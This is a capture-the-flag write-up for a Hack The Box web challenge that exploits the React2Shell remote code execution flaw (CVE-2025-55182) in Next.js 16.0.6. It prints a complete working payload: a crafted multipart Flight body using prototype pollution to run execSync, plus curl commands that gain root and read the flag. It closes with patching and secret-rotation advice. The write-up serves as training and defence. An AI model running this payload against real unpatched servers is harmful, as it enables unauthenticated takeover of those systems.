# HTB - NexusAI

**Category:** Web
**Target:** `154.57.164.82:32475`

## Challenge Scenario

> NexusAI's polished assistant interface promises adaptive learning and seamless interaction. But beneath its reactive front end, subtle glitches hint that user input may be shaping the system in unexpected ways. Explore the platform, trace the echoes in its reactive layer, and uncover the hidden flaw buried behind the UI.

## Recon

The site ("NexusAI - Personal AI Assistants") is a static-looking marketing landing page — no visible login, no chat UI, no obvious API routes. Viewing the raw HTTP response shows it's server-rendered by **Next.js using the App Router**, evidenced by the embedded React Server Components ("RSC") flight payload shipped in `<script>self.__next_f.push(...)</script>` tags.

The challenge also provides a downloadable source zip (`web_reactoops`) containing the app's actual source. The key file is `package.json`:

```json
{
  "name": "react2shell",
  "dependencies": {
    "next": "16.0.6",
    "react": "^19",
    "react-dom": "^19"
  }
}
```

The package name — `react2shell` — is a direct giveaway once you recognize it: this is the nickname of a real, recently disclosed, maximum-severity vulnerability. The pinned Next.js version, `16.0.6`, is the confirming detail — it's exactly one patch release behind the fix.

## The Vulnerability

**CVE-2025-55182 ("React2Shell") / CVE-2025-66478** — a CVSS 10.0 pre-authentication remote code execution vulnerability in the React Server Components ("Flight") protocol, affecting:

- Next.js 15.x and 16.x (before the patched releases: 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7)
- Any App Router application using Server Actions

### Root cause

React Server Components serialize server-side state into a compact wire format (the "Flight" protocol) so the client can hydrate it without a full re-fetch. The server-side *deserializer* for this format trusts more of the incoming request than it should when processing a Server Action invocation. By submitting a crafted multipart body referencing `__proto__` and `constructor` chains, an attacker can pollute internal object prototypes used during deserialization and redirect an internal field (`_response._prefix`) into attacker-controlled JavaScript, which the framework then evaluates server-side — resulting in arbitrary code execution before any authentication check ever runs.

## Exploitation

The exploit is a POST request to the app's root route with a `Next-Action` header (its value is not validated — this app never even defines a Server Action itself; the vulnerable code path lives in Next.js's internal handling and triggers regardless) and a three-part multipart body carrying the malicious Flight payload.

**1. Confirm RCE** with a harmless command (`id`):

```bash
mkdir -p ~/react2shell_poc && cd ~/react2shell_poc

cat > field0.json << 'EOF'
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
EOF

printf '"$@0"' > field1.txt
printf '[]' > field2.txt

curl -X POST "http://154.57.164.82:32475/" \
  -H "Next-Action: x" \
  -F "0=<field0.json" \
  -F "1=<field1.txt" \
  -F "2=<field2.txt" \
  -v
```

Response:

1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"}


Confirmed: unauthenticated RCE, running as **root**. The exploit abuses a thrown `NEXT_REDIRECT` error's `digest` field as a covert channel — `execSync`'s output gets stuffed into the digest, and the framework happily reflects that error detail back in the RSC response.

**2. Locate the flag** by changing the command inside `_prefix`:

```bash
# edit field0.json, replacing the execSync('id', ...) command with:
# find / -maxdepth 4 -iname "flag*" 2>/dev/null
```
Re-send the same curl command. Response:

1:E{"digest":"/app/flag.txt"}


**3. Read the flag:**

```bash
# edit field0.json again, changing the command to: cat /app/flag.txt
```
Re-send the same curl command. Response:
## Flag

## Root Cause & Fix

- **Upgrade immediately.** There is no workaround or mitigation short of patching — upgrade to a fixed release (Next.js `15.0.5`/`15.1.9`/`15.2.6`/`15.3.6`/`15.4.8`/`15.5.7`/`16.0.7` or later, matching your release line). Vercel published `npx fix-react2shell-next` specifically to automate this version bump.
- **Rotate secrets after patching.** Because this bug allows arbitrary command execution pre-auth, any application that was exposed while unpatched should be treated as fully compromised — rotate all environment variables, API keys, and credentials the app had access to, not just apply the patch.
- **Defense in depth:** this class of bug (insecure deserialization leading to prototype pollution leading to RCE) is why frameworks should treat any client-influenceable input to internal serialization protocols as untrusted, and why dependency versions matter — this app was one patch release away from being safe.
- **Operationally:** pin and actively track framework versions against vendor security advisories (GitHub Security Advisories / `npm audit` / Dependabot) rather than letting them drift, especially for internet-facing App Router deployments using Server Actions.

## References

- [Security Advisory: CVE-2025-66478 | Next.js](https://nextjs.org/blog/CVE-2025-66478)
- [CVE-2025-55182 (React2Shell): Remote code execution in React Server Components and Next.js | Datadog Security Labs](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
- [RCE in React Server Components · Advisory · vercel/next.js · GitHub](https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp)
- [CVE-2025-55182: React2Shell - Unauthenticated RCE in React Server Components | p3ta@dc710](https://p3ta00.github.io/cve-2025-55182-react2shell-rce/)
